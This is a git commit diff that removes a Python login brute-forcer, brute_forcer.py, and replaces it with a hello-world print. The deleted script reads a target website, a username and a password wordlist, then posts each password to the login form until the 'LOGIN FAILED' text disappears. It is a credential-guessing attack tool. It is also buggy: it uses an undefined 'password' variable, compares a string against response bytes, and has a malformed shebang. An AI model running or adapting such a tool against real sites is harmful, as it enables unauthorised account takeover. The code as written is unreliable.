bd1bf6a3a2ed061838c4efb0ce2f2dae37fb3f34
krishpranav <krisna.pranav@gmail.com>
2021-07-17 14:38:09 +0530

    update

--- brute_forcer.py
+++ brute_forcer.py
@@ -1,24 +1,3 @@
 #!usr/bin/python3
 
-import requests
-
-username = input("Enter a username > ")
-word_list = input("Enter your path to password list > ")
-website = input("Enter the target website")
-
-target_url = website
-data_dict = {"username": username, "password": password, "Login": "submit"}
-responce = requests.post(target_url, data=data_dict)
-
-with open(word_list, "r") as wordlist_file:
-	for line in wordlist_file:
-		word = line.strip()
-		data_dict["password"] = word
-		responce = requests.post(target_url, data=data_dict)
-		if "LOGIN FAILED" not in responce.content:
-			print("[+] Got the password >>>" + word)
-			exit()
-
-print("[+] Finished Brute Forcing.....")
-
-
+print('hello world')
